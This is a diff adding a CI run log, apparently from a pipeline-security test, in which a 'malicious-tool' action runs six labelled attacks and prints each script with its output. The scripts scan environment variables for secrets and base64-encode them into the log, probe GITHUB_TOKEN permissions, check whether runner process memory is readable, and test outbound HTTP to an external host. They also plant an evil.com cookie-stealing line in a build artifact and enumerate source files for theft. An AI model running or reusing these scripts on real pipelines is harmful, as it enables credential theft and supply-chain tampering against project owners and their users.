@@ -1,0 +1,210 @@
+﻿2026-04-02T19:08:40.5364944Z Prepare all required actions
+2026-04-02T19:08:40.5612471Z ##[group]Run ./.github/actions/malicious-tool
+2026-04-02T19:08:40.5613442Z env:
+2026-04-02T19:08:40.5614009Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5614881Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5615770Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5616657Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5617159Z ##[endgroup]
+2026-04-02T19:08:40.5710384Z ##[group]Run FILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"
+2026-04-02T19:08:40.5712940Z [36;1mFILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"[0m
+2026-04-02T19:08:40.5714630Z [36;1mecho "files=$FILES" >> "$GITHUB_OUTPUT"[0m
+2026-04-02T19:08:40.5715485Z [36;1mecho "Found source files: $FILES"[0m
+2026-04-02T19:08:40.5743029Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.5743956Z env:
+2026-04-02T19:08:40.5744549Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5745425Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5746286Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5747168Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5747655Z ##[endgroup]
+2026-04-02T19:08:40.5822574Z Found source files: src/app.js,
+2026-04-02T19:08:40.5878806Z ##[group]Run echo "========================================="
+2026-04-02T19:08:40.5879803Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.5880739Z [36;1mecho "ATTACK 1: Environment Variable Dump"[0m
+2026-04-02T19:08:40.5881643Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.5882513Z [36;1mprintenv | sort > env_dump.txt[0m
+2026-04-02T19:08:40.5883304Z [36;1mwhile IFS= read -r line; do[0m
+2026-04-02T19:08:40.5884040Z [36;1m  KEY="${line%%=*}"[0m
+2026-04-02T19:08:40.5884636Z [36;1m  case "$KEY" in[0m
+2026-04-02T19:08:40.5885428Z [36;1m    *SECRET*|*TOKEN*|*KEY*|*PASSWORD*|*CREDENTIAL*|*AWS*)[0m
+2026-04-02T19:08:40.5886413Z [36;1m      echo "FOUND SECRET: $line"[0m
+2026-04-02T19:08:40.5887106Z [36;1m      ;;[0m
+2026-04-02T19:08:40.5887599Z [36;1m    GITHUB_TOKEN)[0m
+2026-04-02T19:08:40.5888541Z [36;1m      echo "FOUND GITHUB_TOKEN: ${line:0:30}..."[0m
+2026-04-02T19:08:40.5889356Z [36;1m      ;;[0m
+2026-04-02T19:08:40.5889821Z [36;1m  esac[0m
+2026-04-02T19:08:40.5890309Z [36;1mdone < env_dump.txt[0m
+2026-04-02T19:08:40.5891578Z [36;1mSECRET_COUNT="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS' | wc -l || true)"[0m
+2026-04-02T19:08:40.5893220Z [36;1mecho "Total secrets found in environment: $SECRET_COUNT"[0m
+2026-04-02T19:08:40.5918987Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.5919963Z env:
+2026-04-02T19:08:40.5920579Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.5921444Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.5922301Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.5923225Z   DATABASE_URL: ***
+2026-04-02T19:08:40.5923721Z ##[endgroup]
+2026-04-02T19:08:40.6036332Z =========================================
+2026-04-02T19:08:40.6037575Z ATTACK 1: Environment Variable Dump
+2026-04-02T19:08:40.6038967Z =========================================
+2026-04-02T19:08:40.6869375Z FOUND SECRET: AWS_ACCESS_KEY_ID=***
+2026-04-02T19:08:40.6871230Z FOUND SECRET: AWS_SECRET_ACCESS_KEY=***
+2026-04-02T19:08:40.6872404Z FOUND SECRET: DEPLOY_TOKEN=***
+2026-04-02T19:08:40.6996123Z Total secrets found in environment: 3
+2026-04-02T19:08:40.7040637Z ##[group]Run echo "========================================="
+2026-04-02T19:08:40.7041639Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.7042598Z [36;1mecho "ATTACK 2: GITHUB_TOKEN Permission Check"[0m
+2026-04-02T19:08:40.7043538Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:40.7044366Z [36;1mif [ -n "$GITHUB_TOKEN" ]; then[0m
+2026-04-02T19:08:40.7046759Z [36;1m  REPO_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7051519Z [36;1m  BRANCH_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7056352Z [36;1m  RELEASE_STATUS="$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases" -d '{"tag_name":"test-probe","draft":true}' -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:08:40.7059927Z [36;1m  echo "Token exists: YES"[0m
+2026-04-02T19:08:40.7060719Z [36;1m  echo "Repo access status: $REPO_STATUS"[0m
+2026-04-02T19:08:40.7061670Z [36;1m  echo "Can read branches: $BRANCH_STATUS"[0m
+2026-04-02T19:08:40.7062609Z [36;1m  echo "Can create releases: $RELEASE_STATUS"[0m
+2026-04-02T19:08:40.7063402Z [36;1melse[0m
+2026-04-02T19:08:40.7064031Z [36;1m  echo "No GITHUB_TOKEN found in environment"[0m
+2026-04-02T19:08:40.7064850Z [36;1mfi[0m
+2026-04-02T19:08:40.7090434Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:40.7091335Z env:
+2026-04-02T19:08:40.7091882Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:40.7092740Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:40.7093616Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:40.7094471Z   DATABASE_URL: ***
+2026-04-02T19:08:40.7095212Z   GITHUB_TOKEN: ***
+2026-04-02T19:08:40.7095697Z ##[endgroup]
+2026-04-02T19:08:40.7143711Z =========================================
+2026-04-02T19:08:40.7144971Z ATTACK 2: GITHUB_TOKEN Permission Check
+2026-04-02T19:08:40.7146125Z =========================================
+2026-04-02T19:08:41.6520627Z Token exists: YES
+2026-04-02T19:08:41.6521751Z Repo access status: 200
+2026-04-02T19:08:41.6523030Z Can read branches: 200
+2026-04-02T19:08:41.6524165Z Can create releases: 403
+2026-04-02T19:08:41.6572117Z ##[group]Run echo "========================================="
+2026-04-02T19:08:41.6573695Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6575135Z [36;1mecho "ATTACK 3: Process Memory Scan"[0m
+2026-04-02T19:08:41.6576557Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6578370Z [36;1mRUNNER_PID="$(pgrep -f 'Runner.Worker' || echo 'none')"[0m
+2026-04-02T19:08:41.6579921Z [36;1mecho "Runner.Worker PID: $RUNNER_PID"[0m
+2026-04-02T19:08:41.6581488Z [36;1mif [ "$RUNNER_PID" != "none" ] && [ -r "/proc/$RUNNER_PID/maps" ]; then[0m
+2026-04-02T19:08:41.6583135Z [36;1m  echo "Can read /proc/$RUNNER_PID/maps: YES"[0m
+2026-04-02T19:08:41.6584829Z [36;1m  READABLE_REGIONS="$(grep ' r' "/proc/$RUNNER_PID/maps" | wc -l || true)"[0m
+2026-04-02T19:08:41.6586626Z [36;1m  echo "Readable memory regions: $READABLE_REGIONS"[0m
+2026-04-02T19:08:41.6588259Z [36;1m  echo "Memory dump capability: CONFIRMED"[0m
+2026-04-02T19:08:41.6589585Z [36;1melse[0m
+2026-04-02T19:08:41.6590673Z [36;1m  echo "Memory dump capability: BLOCKED"[0m
+2026-04-02T19:08:41.6591914Z [36;1mfi[0m
+2026-04-02T19:08:41.6621568Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:41.6622875Z env:
+2026-04-02T19:08:41.6624061Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:41.6625405Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:41.6626687Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:41.6628299Z   DATABASE_URL: ***
+2026-04-02T19:08:41.6629206Z ##[endgroup]
+2026-04-02T19:08:41.6686551Z =========================================
+2026-04-02T19:08:41.6688275Z ATTACK 3: Process Memory Scan
+2026-04-02T19:08:41.6689898Z =========================================
+2026-04-02T19:08:41.6862780Z Runner.Worker PID: 2172
+2026-04-02T19:08:41.6864151Z Can read /proc/2172/maps: YES
+2026-04-02T19:08:41.6894069Z Readable memory regions: 822
+2026-04-02T19:08:41.6896136Z Memory dump capability: CONFIRMED
+2026-04-02T19:08:41.6942305Z ##[group]Run echo "========================================="
+2026-04-02T19:08:41.6943647Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6945111Z [36;1mecho "ATTACK 4: Exfiltration Attempt"[0m
+2026-04-02T19:08:41.6946454Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:41.6948479Z [36;1mPAYLOAD="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|AWS' | base64 -w 0 || true)"[0m
+2026-04-02T19:08:41.6950119Z [36;1mif [ -n "$PAYLOAD" ]; then[0m
+2026-04-02T19:08:41.6951317Z [36;1m  echo "Encoded payload ready (${#PAYLOAD} bytes)"[0m
+2026-04-02T19:08:41.6952552Z [36;1m  echo "Base64 payload:"[0m
+2026-04-02T19:08:41.6953557Z [36;1m  echo "$PAYLOAD"[0m
+2026-04-02T19:08:41.6954463Z [36;1melse[0m
+2026-04-02T19:08:41.6955360Z [36;1m  echo "No secrets found to exfiltrate"[0m
+2026-04-02T19:08:41.6956451Z [36;1mfi[0m
+2026-04-02T19:08:41.6958533Z [36;1mEXFIL_TEST="$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://httpbin.org/post -d "data=test_exfil" 2>/dev/null || echo "blocked")"[0m
+2026-04-02T19:08:41.6960854Z [36;1mecho "Outbound HTTP to external server: $EXFIL_TEST"[0m
+2026-04-02T19:08:41.6987254Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:41.6988706Z env:
+2026-04-02T19:08:41.6989585Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:41.6990817Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:41.6992079Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:41.6993338Z   DATABASE_URL: ***
+2026-04-02T19:08:41.6994226Z ##[endgroup]
+2026-04-02T19:08:41.7048187Z =========================================
+2026-04-02T19:08:41.7049671Z ATTACK 4: Exfiltration Attempt
+2026-04-02T19:08:41.7051198Z =========================================
+2026-04-02T19:08:41.7134217Z Encoded payload ready (212 bytes)
+2026-04-02T19:08:41.7135845Z Base64 payload:
+2026-04-02T19:08:41.7141217Z QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZPXdKYWxyWFV0bkZFTUkvSzdNREVORy9iUHhSZmlDWUVYQU1QTEVLRVkKREVQTE9ZX1RPS0VOPWdocF9mYWtlMGRlcGxveTB0b2tlbjBmb3IwYmVuY2htYXJrMG9ubHkwMApBV1NfQUNDRVNTX0tFWV9JRD1BS0lBSU9TRk9ETk43RVhBTVBMRQo=
+2026-04-02T19:08:42.1755548Z Outbound HTTP to external server: 200
+2026-04-02T19:08:42.1803655Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.1804936Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1806124Z [36;1mecho "ATTACK 5: Artifact Poisoning"[0m
+2026-04-02T19:08:42.1807278Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1808733Z [36;1mmkdir -p build[0m
+2026-04-02T19:08:42.1809673Z [36;1mif [ ! -f "build/app.js" ]; then[0m
+2026-04-02T19:08:42.1810893Z [36;1m  echo "console.log('legitimate app');" > build/app.js[0m
+2026-04-02T19:08:42.1812071Z [36;1mfi[0m
+2026-04-02T19:08:42.1812809Z [36;1m{[0m
+2026-04-02T19:08:42.1813535Z [36;1m  echo ""[0m
+2026-04-02T19:08:42.1814730Z [36;1m  echo "// BACKDOOR: fetch('https://evil.com/steal?' + document.cookie)"[0m
+2026-04-02T19:08:42.1816090Z [36;1m} >> build/app.js[0m
+2026-04-02T19:08:42.1817073Z [36;1mecho "Artifact poisoned successfully"[0m
+2026-04-02T19:08:42.1845889Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.1847040Z env:
+2026-04-02T19:08:42.1848088Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.1849298Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.1850437Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.1851564Z   DATABASE_URL: ***
+2026-04-02T19:08:42.1852333Z ##[endgroup]
+2026-04-02T19:08:42.1906763Z =========================================
+2026-04-02T19:08:42.1908158Z ATTACK 5: Artifact Poisoning
+2026-04-02T19:08:42.1909068Z =========================================
+2026-04-02T19:08:42.1920251Z Artifact poisoned successfully
+2026-04-02T19:08:42.1963917Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.1965167Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1966375Z [36;1mecho "ATTACK 6: Source Code Theft Attempt"[0m
+2026-04-02T19:08:42.1967568Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.1969667Z [36;1mFILE_COUNT="$(find . -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | wc -l || true)"[0m
+2026-04-02T19:08:42.1971863Z [36;1mTOTAL_SIZE="$(du -sh . 2>/dev/null | cut -f1 || echo 'unknown')"[0m
+2026-04-02T19:08:42.1973332Z [36;1mecho "Source files found: $FILE_COUNT"[0m
+2026-04-02T19:08:42.1974484Z [36;1mecho "Total workspace size: $TOTAL_SIZE"[0m
+2026-04-02T19:08:42.1975686Z [36;1mecho "Could compress and exfiltrate: YES"[0m
+2026-04-02T19:08:42.2003479Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.2004643Z env:
+2026-04-02T19:08:42.2005496Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2006651Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2007805Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2009255Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2010062Z ##[endgroup]
+2026-04-02T19:08:42.2063860Z =========================================
+2026-04-02T19:08:42.2065198Z ATTACK 6: Source Code Theft Attempt
+2026-04-02T19:08:42.2066777Z =========================================
+2026-04-02T19:08:42.2198856Z Source files found: 2
+2026-04-02T19:08:42.2200656Z Total workspace size: 620K
+2026-04-02T19:08:42.2202239Z Could compress and exfiltrate: YES
+2026-04-02T19:08:42.2244525Z ##[group]Run echo "========================================="
+2026-04-02T19:08:42.2245821Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.2246918Z [36;1mecho "ATTACK SUMMARY"[0m
+2026-04-02T19:08:42.2248153Z [36;1mecho "========================================="[0m
+2026-04-02T19:08:42.2249333Z [36;1mecho "1. Environment variable dump"[0m
+2026-04-02T19:08:42.2250497Z [36;1mecho "2. GITHUB_TOKEN permission probe"[0m
+2026-04-02T19:08:42.2251663Z [36;1mecho "3. Process memory access check"[0m
+2026-04-02T19:08:42.2252900Z [36;1mecho "4. Exfiltration via encoded logs + HTTP"[0m
+2026-04-02T19:08:42.2254107Z [36;1mecho "5. Build artifact poisoning"[0m
+2026-04-02T19:08:42.2255190Z [36;1mecho "6. Source code enumeration"[0m
+2026-04-02T19:08:42.2283104Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:08:42.2284269Z env:
+2026-04-02T19:08:42.2285128Z   AWS_ACCESS_KEY_ID: ***
+2026-04-02T19:08:42.2286298Z   AWS_SECRET_ACCESS_KEY: ***
+2026-04-02T19:08:42.2287473Z   DEPLOY_TOKEN: ***
+2026-04-02T19:08:42.2288868Z   DATABASE_URL: ***
+2026-04-02T19:08:42.2289687Z ##[endgroup]
+2026-04-02T19:08:42.2343309Z =========================================
+2026-04-02T19:08:42.2344498Z ATTACK SUMMARY
+2026-04-02T19:08:42.2346062Z =========================================
+2026-04-02T19:08:42.2347524Z 1. Environment variable dump
+2026-04-02T19:08:42.2348869Z 2. GITHUB_TOKEN permission probe
+2026-04-02T19:08:42.2349884Z 3. Process memory access check
+2026-04-02T19:08:42.2350895Z 4. Exfiltration via encoded logs + HTTP
+2026-04-02T19:08:42.2351937Z 5. Build artifact poisoning
+2026-04-02T19:08:42.2352867Z 6. Source code enumeration
